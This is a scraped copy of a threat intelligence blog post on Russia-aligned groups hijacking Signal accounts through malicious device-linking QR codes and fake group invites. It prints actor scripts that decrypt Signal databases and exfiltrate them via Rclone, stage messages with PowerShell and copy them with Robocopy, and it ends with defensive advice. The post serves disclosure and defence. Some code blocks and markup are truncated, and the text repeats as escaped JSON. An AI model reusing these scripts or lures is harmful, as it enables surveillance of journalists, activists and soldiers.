class="nRhiJb-DbgRPb-wNfPc-ma6Yeb nRhiJb-DbgRPb-wNfPc-cGMI2b"><section class="DA9Qj nRhiJb-ObfsIf nRhiJb-fmcmS-oXtfBe"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-c5RTEf"></div><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-qWD73c"><h5 class="cHE8Ub Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-qWD73c">Google Threat Intelligence Group </h5><p class="nRhiJb-qJTHM khCp7b"></p></div></section></div></section><div class="nRhiJb-DARUcf"><div class="nRhiJb-ObfsIf nRhiJb-DbgRPb-wNfPc-ma6Yeb nRhiJb-DbgRPb-qWD73c-cGMI2b"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-ibL1re dzoHJ"></div><div class="OYL9D nRhiJb-kR0ZEf-OWXEXe-GV1x9e-OiUrBf" jsname="tx2NYc"><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Written by: Dan Black</p>
<hr></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">Google Threat Intelligence Group (GTIG) has observed increasing efforts from several Russia state-aligned threat actors to compromise Signal Messenger accounts used by individuals of interest to Russia's intelligence services. While this emerging operational interest has likely been sparked by wartime demands to gain access to sensitive government and military communications in the context of Russia's re-invasion of Ukraine, we anticipate the tactics and methods used to target Signal will grow in prevalence in the near-term and proliferate to additional threat actors and regions outside the Ukrainian theater of war.</span></p>
<p><span style="vertical-align:baseline">Signal's popularity among common targets of surveillance and espionage activity—such as military personnel, politicians, journalists, activists, and other at-risk communities—has positioned the secure messaging application as a high-value target for adversaries seeking to intercept sensitive information that could fulfil a range of different intelligence requirements. More broadly, this threat also extends to other popular messaging applications such as WhatsApp and Telegram, which are also being actively targeted by Russian-aligned threat groups using similar techniques. In anticipation of a wider adoption of similar tradecraft by other threat actors, we are issuing a public warning regarding the tactics and methods used to date to help build public awareness and help communities better safeguard themselves from similar threats.</span></p>
<p><span style="vertical-align:baseline"><span style="vertical-align:baseline">We are grateful to the team at Signal for their close partnership in investigating this activity. The latest Signal releases on </span><a href="https://github.com/signalapp/Signal-Android/commit/112874c08019a40b6f8f1dbbf84eb0ab4d796582" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">Android</span></a><span style="vertical-align:baseline"> and </span><a href="https://github.com/signalapp/Signal-iOS/commit/498b97033254c514404345efc1d4c29c1b076f6c" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">iOS</span></a><span style="vertical-align:baseline"> contain hardened features designed to help protect against similar phishing campaigns in the future. </span><a href="https://support.signal.org/hc/en-us/articles/360007059212-How-do-I-ensure-Signal-is-up-to-date" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">Update</span></a><span style="vertical-align:baseline"> to the latest version to enable these features.</span></span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h2><span style="vertical-align:baseline">Phishing Campaigns Abusing Signal's "Linked Devices" Feature</span></h2>
<p><span style="vertical-align:baseline">The most novel and widely used technique underpinning Russian-aligned attempts to compromise Signal accounts is the abuse of the app's legitimate "</span><a href="https://support.signal.org/hc/en-us/articles/360007320551-Linked-Devices" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">linked devices</span></a><span style="vertical-align:baseline">" feature that enables Signal to be used on multiple devices concurrently. Because linking an additional device typically requires scanning a quick-response (QR) code, threat actors have resorted to crafting malicious QR codes that, when scanned, will link a victim's account to an actor-controlled Signal instance. If successful, future messages will be delivered synchronously to both the victim and the threat actor in real-time, providing a persistent means to eavesdrop on the victim's secure conversations without the need for full-device compromise.</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">In remote phishing operations observed to date, malicious QR codes have frequently been masked as legitimate Signal resources, such as group invites, security alerts, or as legitimate device pairing instructions from the Signal website.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">In more tailored remote phishing operations, malicious device-linking QR codes have been embedded in phishing pages crafted to appear as specialized applications used by the Ukrainian military.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Beyond remote phishing and malware delivery operations, we have also seen malicious QR codes being used in close-access operations. </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/apt44-unearthing-sandworm"><span style="text-decoration:underline;vertical-align:baseline">APT44</span></a><span style="vertical-align:baseline"> (aka Sandworm or Seashell Blizzard, a threat actor attributed by </span><a href="https://www.justice.gov/opa/pr/six-russian-gru-officers-charged-connection-worldwide-deployment-destructive-malware-and" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">multiple</span></a><span style="vertical-align:baseline"> governments to the Main Centre for Special Technologies (GTsST) within Main Directorate of the General Staff of the Armed Forces of the Russian Federation (GU), known commonly as the GRU) has worked to enable forward-deployed Russian military forces to link Signal accounts on devices captured on the battlefield back to actor-controlled infrastructure for follow-on exploitation.</span></p>
</li>
</ul>
<p><span style="vertical-align:baseline">Notably, this device-linking concept of operations has proven to be a low-signature form of initial access due to the lack of centralized, technology-driven detections and defenses that can be used to monitor for account compromise via newly linked devices; when successful, there is a high risk that a compromise can go unnoticed for extended periods of time.</span></p>
<h2><span style="vertical-align:baseline">UNC5792: Modified Signal Group Invites</span></h2>
<p><span style="vertical-align:baseline">To compromise Signal accounts using the device-linking feature, one suspected Russian espionage cluster tracked as UNC5792 (which partially overlaps with CERT-UA's </span><a href="https://cert.gov.ua/article/6278735" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">UAC-0195</span></a><span style="vertical-align:baseline">) has altered legitimate "</span><a href="https://support.signal.org/hc/en-us/articles/360051086971-Group-Link-or-QR-code" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">group invite</span></a><span style="vertical-align:baseline">" pages for delivery in phishing campaigns, replacing the expected redirection to a Signal group with a redirection to a malicious URL crafted to link an actor-controlled device to the victim's Signal account.</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">In these operations, UNC5792 has hosted modified Signal group invitations on actor-controlled infrastructure designed to appear identical to a legitimate Signal group invite.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">In each of the fake group invites, JavaScript code that typically redirects the user to join a Signal group has been replaced by a malicious block containing the Uniform Resource Identifier (URI) used by Signal to link a new device to Signal (i.e., "sgnl://linkdevice?uuid="), tricking victims into linking their Signal accounts to a device controlled by UNC5792.</span></p>
</li>
</ul></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig1-signal.max-1600x1600.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig1-signal.max-1600x1600.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig1-signal.max-1600x1600.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig1-signal.max-1600x1600.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 1: Example modified Signal group invite hosted on UNC5792-controlled domain "signal-groups[.]tech"</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>function doRedirect() {

<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%"><span style="vertical-align:baseline">Figure 3: Example of UNC5792 modified redirect code used to link the victim's device to an actor-controlled Signal instance</span></span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h2><span style="vertical-align:baseline">UNC4221: Custom-Developed Signal Phishing Kit</span></h2>
<p><span style="vertical-align:baseline">UNC4221 (tracked by CERT-UA as </span><a href="https://cert.gov.ua/article/6281632" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">UAC-0185</span></a><span style="vertical-align:baseline">) is an additional Russia-linked threat actor who has actively targeted Signal accounts used by Ukrainian military personnel. The group operates a tailored Signal phishing kit designed to mimic components of the </span><a href="https://united24media.com/war-in-ukraine/ukraines-secret-weapon-kropyva-software-4026#:~:text=Kropyva&#39;s%20impact&amp;text=Amongst%20the%20Ukrainian%20Armed%20Forces,applications%20across%20Ukraine&#39;s%20armed%20forces." rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">Kropyva</span></a><span style="vertical-align:baseline"> application used by the Armed Forces of Ukraine for artillery guidance. Similar to the social engineering approach used by UNC5792, UNC4221 has also attempted to mask its device-linking functionality as an invite to a Signal group from a trusted contact. Different variations of this phishing kit have been observed, including:</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Phishing websites that redirect victims to secondary phishing infrastructure masquerading as legitimate device-linking instructions provisioned by Signal (Figure 4)</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Phishing websites with the malicious device-linking QR code directly embedded into the primary Kropyva-themed phishing kit (Figure 5)</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">In earlier operations in 2022, UNC4221 phishing pages were crafted to appear as a legitimate security alert from Signal (Figure 6)</span></p>
</li>
</ul></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" on UNC4221-controlled domain "signal-confirm[.]site"</p></span></div></section></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig5-signal.max-1200x1200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig5-signal.max-1200x1200.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 5: UNC4221 phishing page mimicking the networking component of Kropyva hosted at "teneta.add-group[.]site". The page invites the user to "Sign in to Signal" (Ukrainian: "Авторизуватись у Signal"), which in turn displays a QR code linked to an UNC4221-controlled Signal instance.</p></span></div></section></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig6-signal.max-1400x1400.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig6-signal.max-1400x1400.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig6-signal.max-1400x1400.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig6-signal.max-1400x1400.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 6: Phishing page crafted to appear as a Signal security alert hosted on UNC4221-controlled domain signal-protect[.]host</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">Notably, as a core component of its Signal targeting, UNC4221 has also used a lightweight JavaScript payload tracked as PINPOINT to collect basic user information and geolocation data using the browser's GeoLocation API. In general, we expect to see secure messages and location data to frequently feature as joint targets in future operations of this nature, particularly in the context of targeted surveillance operations or support to conventional military operations.</span></p>
<h2><span style="vertical-align:baseline">Wider Russian and Belarusian Efforts to Steal Messages From Signal</span></h2>
<p><span style="vertical-align:baseline">Beyond targeted efforts to link additional actor-controlled devices to victim Signal accounts, multiple known and established regional threat actors have also been observed operating capabilities designed to steal Signal database files from Android and Windows devices.</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">APT44 has been observed operating WAVESIGN, a lightweight Windows Batch script, to periodically query Signal messages from a victim's Signal database and exfiltrate those most recent messages using Rclone (Figure 7).</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">As reported in 2023 by the </span><a href="https://ssu.gov.ua/en/novyny/sbu-exposes-russian-intelligence-attempts-to-penetrate-armed-forces-planning-operations-system" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">Security Service of Ukraine</span></a><span style="vertical-align:baseline"> (SSU) and the UK's </span><a href="https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/infamous-chisel/NCSC-MAR-Infamous-Chisel.pdf" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">National Cyber Security Centre</span></a><span style="vertical-align:baseline"> (NCSC), the Android malware tracked as Infamous Chisel and attributed by the respective organizations to Sandworm, is designed to recursively search for a list of file extensions including the local database for a series of messaging applications, including Signal, on Android devices.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Turla, a Russian threat actor attributed by the </span><a href="https://www.justice.gov/opa/pr/justice-department-announces-court-authorized-disruption-snake-malware-network-controlled" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">United States</span></a><span style="vertical-align:baseline"> and </span><a href="https://www.gov.uk/government/publications/russias-fsb-malign-cyber-activity-factsheet/russias-fsb-malign-activity-factsheet" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">United Kingdom</span></a><span style="vertical-align:baseline"> to Center 16 of the Federal Security Service (FSB) of the Russian Federation, has also operated a lightweight PowerShell script in post-compromise contexts to stage Signal Desktop messages for exfiltration (Figure 8).</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Extending beyond Russia, Belarus-linked UNC1151 has used the command-line utility Robocopy to stage the contents of file directories used by Signal Desktop to store messages and attachments for later exfiltration (Figure 9).</span></p>
</li>
</ul></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>if %proflag%==1 (
    C:\ProgramData\Signal\Storage\sqlcipher.exe %new% &quot;PRAGMA key=&quot;&quot;x&#39;%key%&#39;&quot;&quot;;&quot; &quot;.recover&quot; &gt; NUL

    C:\ProgramData\Signal\Storage\rc.exe copy -P -I --log-file=C:\ProgramData\Signal\Storage\rclog.txt --log-level INFO C:\ProgramData\Signal\Storage\Signal\sqlorig si:SignalFresh/sqlorig
    del C:\ProgramData\Signal\Storage\Signal\log*
    rmdir /s /q C:\ProgramData\Signal\Storage\sql
    move C:\ProgramData\Signal\Storage\Signal\sql C:\ProgramData\Signal\Storage\sql
) ELSE (

    C:\ProgramData\Signal\Storage\sqlcipher.exe %old% &quot;PRAGMA key=&quot;&quot;x&#39;%key%&#39;&quot;&quot;;&quot; &quot;.recover&quot; &gt; NUL
    C:\ProgramData\Signal\Storage\sqlcipher.exe %old% &quot;PRAGMA key=&quot;&quot;x&#39;%key%&#39;&quot;&quot;;select count(*) from sqlite_master;ATTACH DATABASE &#39;%old_dec%&#39; AS plaintext KEY &#39;&#39;;SELECT sqlcipher_export(&#39;plaintext&#39;);DETACH DATABASE plaintext;&quot;
    C:\ProgramData\Signal\Storage\sqlcipher.exe %new% &quot;PRAGMA key=&quot;&quot;x&#39;%key%&#39;&quot;&quot;;&quot; &quot;.recover&quot; &gt; NUL
    C:\ProgramData\Signal\Storage\sqlcipher.exe %new% &quot;PRAGMA key=&quot;&quot;x&#39;%key%&#39;&quot;&quot;;select count(*) from sqlite_master;ATTACH DATABASE &#39;%new_dec%&#39; AS plaintext KEY &#39;&#39;;SELECT sqlcipher_export(&#39;plaintext&#39;);DETACH DATABASE plaintext;&quot;
    C:\ProgramData\Signal\Storage\sqldiff.exe --primarykey --vtab %old_dec% %new_dec% &gt; %diff_name%
    del /s %old_dec% %new_dec%

    rmdir /s /q C:\ProgramData\Signal\Storage\sql
    move C:\ProgramData\Signal\Storage\Signal\sql C:\ProgramData\Signal\Storage\sql

    powershell -Command &quot;move C:\ProgramData\Signal\Storage\log.tmp C:\ProgramData\Signal\Storage\Signal\log$(Get-Date -f &quot;&quot;&quot;ddMMyyyyHHmmss&quot;&quot;&quot;).tmp&quot;
)</code></pre>
<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%"><span style="vertical-align:baseline">Figure 7:</span><strong style="vertical-align:baseline"> </strong><span style="vertical-align:baseline">Code snippet from WAVESIGN used by APT44 to exfiltrate Signal messages</span></span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>$TempPath = $env:tmp
$TempPath = $env:temp

$ComputerName = $env:computername
$DFSRoot = "\\redacted"
$RRoot = $DFSRoot + "resource\"

$frand = Get-Random -Minimum 1 -Maximum 10000

Get-ChildItem "C:\Users\..\AppData\Roaming\SIGNAL\config.json" | Out-File $treslocal -Append
Get-ChildItem "C:\Users\..\AppData\Roaming\SIGNAL\sql\db.sqlite" | Out-File $treslocal -Append

Get-ChildItem "C:\Users\..\AppData\Roaming\SIGNAL\config.json" | Out-File $treslocal -Append

$zipfile = $TempPath + "\" + $file1

<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%"><span style="vertical-align:baseline">Figure 8:</span><strong style="vertical-align:baseline"> </strong><span style="vertical-align:baseline">PowerShell script used by Turla to exfiltrate Signal messages</span></span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>C:\Windows\system32\cmd.exe /C cd %appdata% &amp;&amp; robocopy 
&quot;%userprofile%\AppData\Roaming\Signal&quot; C:\Users\Public\data\signa /S</code></pre>
<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%"><span style="vertical-align:baseline">Figure 9:</span><strong style="vertical-align:baseline"> </strong><span style="vertical-align:baseline">Robocopy command used by UNC1151 to stage Signal file directories for exfiltration</span></span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h2><span style="vertical-align:baseline">Outlook and Implications</span></h2>
<p><span style="vertical-align:baseline">The operational emphasis on Signal from multiple threat actors in recent months serves as an important warning for the growing threat to secure messaging applications that is certain to intensify in the near-term. When placed in a wider context with other trends in the threat landscape, such as the growing commercial spyware industry and the surge of mobile malware variants being leveraged in active conflict zones, there appears to be a clear and growing demand for offensive cyber capabilities that can be used to monitor the sensitive communications of individuals who rely on secure messaging applications to safeguard their online activity.</span></p>
<p><span style="vertical-align:baseline">As reflected in wide ranging efforts to compromise Signal accounts, this threat to secure messaging applications is not limited to remote cyber operations such as phishing and malware delivery, but also critically includes close-access operations where a threat actor can secure brief access to a target's unlocked device. Equally important, this threat is not only limited to Signal, but also extends to other widely used messaging platforms, including WhatsApp and Telegram, which have likewise factored into the targeting priorities of several of the aforementioned Russia-aligned groups in recent months. For an example of this wider targeting interest, see Microsoft Threat Intelligence's </span><a href="https://www.microsoft.com/en-us/security/blog/2025/01/16/new-star-blizzard-spear-phishing-campaign-targets-whatsapp-accounts/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">recent blog post</span></a><span style="vertical-align:baseline"> on a COLDRIVER (aka UNC4057 and Star Blizzard) campaign attempting to abuse the linked device feature to compromise WhatsApp accounts.  </span></p>
<p><span style="vertical-align:baseline">Potential targets of government-backed intrusion activity targeting their personal devices should adopt practices to help safeguard themselves, including:</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Enable </span><a href="https://support.google.com/android/answer/9079129?hl=en" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">screen lock</span></a><span style="vertical-align:baseline"> on all mobile devices using a long, complex password with a mix of uppercase and lowercase letters, numbers, and symbols. Android supports alphanumeric passwords, which offer significantly more security than numeric-only PINs or patterns.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Install operating system updates as soon as possible and always use the latest version of Signal and other messaging apps.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Ensure </span><a href="https://support.google.com/googleplay/answer/2812853?hl=en" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">Google Play Protect</span></a><span style="vertical-align:baseline"> is enabled, which is on by default on Android devices with Google Play Services. Google Play Protect checks your apps and devices for harmful behavior and can warn users or block apps known to exhibit malicious behavior, even when those apps come from sources outside of Play.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Audit linked devices regularly for unauthorized devices by navigating to the "Linked devices" section in the application's settings.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Exercise caution when interacting with QR codes and web resources purporting to be software updates, group invites, or other notifications that appear legitimate and urge immediate action.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">If available, use two-factor authentication such as fingerprint, facial recognition, a security key, or a one-time code to verify when your account is logged into or linked to a new device.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">iPhone users concerned about targeted surveillance or espionage activity should consider enabling </span><a href="https://support.apple.com/en-ca/guide/iphone/iph049680987/ios" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">Lockdown Mode</span></a><span style="vertical-align:baseline"> to reduce their attack surface.</span></p>
</li>
</ul></span></section><section class="k6ctOd"><aside class="IwVNTb"><div class="ecJG2e nRhiJb-ObfsIf"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-qWD73c nRhiJb-kR0ZEf-OWXEXe-GV1x9e-OiUrBf-V2iZpe style="vertical-align:baseline">Indicators of Compromise</span></h2>
<p><span style="vertical-align:baseline">To assist organizations hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a <a href="https://www.virustotal.com/gui/collection/b9885b58701486f26d370ea939aaffc263d5c4053696bfe82911247ef43da85a" rel="noopener" target="_blank">GTI Collection</a> for registered users.</span></p>
<p><span style="vertical-align:baseline">See Table 1 for a sample of relevant indicators of compromise.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><div align="center">

Messenger"],null,null,[[null,null,[null,[null,"\u003cp\u003eWritten by: Dan Black\u003c/p\u003e\n\u003chr\u003e"]]],[null,null,[null,[null,"\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eGoogle Threat Intelligence Group (GTIG) has observed increasing efforts from several Russia state-aligned threat actors to compromise Signal Messenger accounts used by individuals of interest to Russia's intelligence services. While this emerging operational interest has likely been sparked by wartime demands to gain access to sensitive government and military communications in the context of Russia's re-invasion of Ukraine, we anticipate the tactics and methods used to target Signal will grow in prevalence in the near-term and proliferate to additional threat actors and regions outside the Ukrainian theater of war.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eSignal's popularity among common targets of surveillance and espionage activity—such as military personnel, politicians, journalists, activists, and other at-risk communities—has positioned the secure messaging application as a high-value target for adversaries seeking to intercept sensitive information that could fulfil a range of different intelligence requirements. More broadly, this threat also extends to other popular messaging applications such as WhatsApp and Telegram, which are also being actively targeted by Russian-aligned threat groups using similar techniques. In anticipation of a wider adoption of similar tradecraft by other threat actors, we are issuing a public warning regarding the tactics and methods used to date to help build public awareness and help communities better safeguard themselves from similar threats.\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eWe are grateful to the team at Signal for their close partnership in investigating this activity. The latest Signal releases on \u003c/span\u003e\u003ca href\u003d\"https://github.com/signalapp/Signal-Android/commit/112874c08019a40b6f8f1dbbf84eb0ab4d796582\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eAndroid\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e and \u003c/span\u003e\u003ca href\u003d\"https://github.com/signalapp/Signal-iOS/commit/498b97033254c514404345efc1d4c29c1b076f6c\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eiOS\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e contain hardened features designed to help protect against similar phishing campaigns in the future. \u003c/span\u003e\u003ca href\u003d\"https://support.signal.org/hc/en-us/articles/360007059212-How-do-I-ensure-Signal-is-up-to-date\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003eUpdate\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e to the latest version to enable these features.\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e"]]],[null,null,[null,[null,"\u003ch2\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003ePhishing Campaigns Abusing Signal's \"Linked Devices\" Feature\u003c/span\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThe most novel and widely used technique underpinning Russian-aligned attempts to compromise Signal accounts is the abuse of the app's legitimate \"\u003c/span\u003e\u003ca href\u003d\"https://support.signal.org/hc/en-us/articles/360007320551-Linked-Devices\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cspan style\u003d\"text-decoration:underline;vertical-align:baseline\"\u003elinked devices\u003c/span\u003e\u003c/a\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e\" feature that enables Signal to be used on multiple devices concurrently. Because linking an additional device typically requires scanning a quick-response (QR) code, threat actors have resorted to crafting malicious QR codes that, when scanned, will link a victim's account to an actor-controlled Signal instance. If successful, future messages will be delivered synchronously to both the victim and the threat actor in real-time, providing a persistent means to eavesdrop on the victim's secure conversations without the need for full-device compromise.\u003c/span\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli style\u003d\"list-style-type:disc;vertical-align:baseline\"\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eIn remote phishing operations observed to date, malicious QR codes have frequently been masked as legitimate Signal resources, such as group invites, security alerts, or as legitimate device pairing instructions from the Signal 